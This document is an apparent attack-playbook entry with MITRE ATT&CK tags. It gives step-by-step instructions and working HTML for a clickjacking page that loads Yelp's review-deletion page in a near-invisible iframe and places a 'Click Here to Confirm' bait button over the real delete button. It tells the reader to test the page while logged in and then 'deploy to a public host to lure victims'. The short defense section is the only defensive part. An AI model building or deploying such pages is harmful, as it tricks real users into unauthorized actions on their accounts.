---
tags:
  - clickjacking
  - iframe
  - html
  - web-exploit
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Drive-by Compromise]]'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 6f008742-ff60-4536-862f-52720a58782f
created_at: '2025-12-14T17:28:05.319Z'
updated_at: '2025-12-14T17:28:05.319Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Create-Malicious-HTML-for-Clickjacking

## Summary

This procedure creates a malicious HTML webpage that embeds a target page (e.g., Yelp's review deletion interface) in an invisible iframe, overlaying interactive elements to facilitate clickjacking attacks. It enables tricking users into performing unintended actions like deleting reviews by making the iframe transparent and positioning deceptive buttons over the real ones.

## Description

In a clickjacking attack, the attacker crafts an HTML page that loads the victim's target page within an iframe set to be invisible (opacity: 0) and precisely positioned. The Yelp review removal page is embedded using the specific URL for a user's review deletion endpoint. A visible, enticing button (e.g., "Click to Win") is placed exactly over the real delete button in the iframe. When the user clicks the fake button, it propagates to the iframe, executing the deletion. This exploits the absence of X-Frame-Options or CSP frame-ancestors directives on the target page. Prerequisites include knowing the victim's review URL (via phishing or enumeration) and hosting the HTML file accessibly.

## Requirements

1. Access to a text editor (e.g., VS Code) to create the HTML file
2. Web hosting capability (local server like Python's http.server or remote like GitHub Pages) to serve the page
3. Victim's specific Yelp review deletion URL (e.g., https://www.yelp.com/writeareview?hrid=example)
4. Basic knowledge of CSS positioning for overlay accuracy

## Defense

Defensive measures and detection strategies:

- Implement X-Frame-Options: DENY or SAMEORIGIN headers on sensitive pages
- Use Content Security Policy (CSP) with frame-ancestors 'none' to block iframe embedding
- Monitor for unusual review deletion patterns via logging and anomaly detection
- Educate users on phishing and suspicious links

## Objectives

1. Embed the target deletion page invisibly to avoid detection
2. Overlay deceptive UI elements to capture user clicks
3. Enable unauthorized actions without alerting the user

## Instructions

### Step 1: Set Up Basic HTML Structure

**Context**: Create the foundation of the malicious page with an invisible iframe targeting the Yelp review deletion URL.

Open a text editor and write the following HTML:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Fake Page</title>
    <style>
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            opacity: 0.1; /* Nearly invisible */
            width: 800px;
            height: 600px;
            border: none;
            pointer-events: auto;
        }
        .bait {
            position: absolute;
            top: 200px; /* Adjust to match delete button position */
            left: 300px;
            z-index: 1;
            background: #4CAF50;
            color: white;
            padding: 10px;
            border: none;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h1>Click the button below to proceed!</h1>
    <button class="bait">Click Here to Confirm</button>
    <iframe src="https://www.yelp.com/writeareview?hrid=VICTIM_REVIEW_ID"></iframe>
</body>
</html>
```

> Replace VICTIM_REVIEW_ID with the actual review ID. This loads the Yelp page in the iframe and positions a green bait button over the expected delete button location. Test locally by opening in a browser to ensure the iframe loads.

### Step 2: Host and Test the Page

**Context**: Serve the HTML file and verify the overlay works by simulating user interaction.

Use a local server for testing:

```bash
python -m http.server 8000
```

> Navigate to http://localhost:8000 in a browser authenticated to Yelp. Click the bait button and confirm it triggers the delete action in the iframe (monitor network requests or Yelp account). Adjust CSS positions if the overlay is misaligned. Once verified, deploy to a public host to lure victims.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[clickjacking]]
- [[iframe]]
- [[web-exploit]]
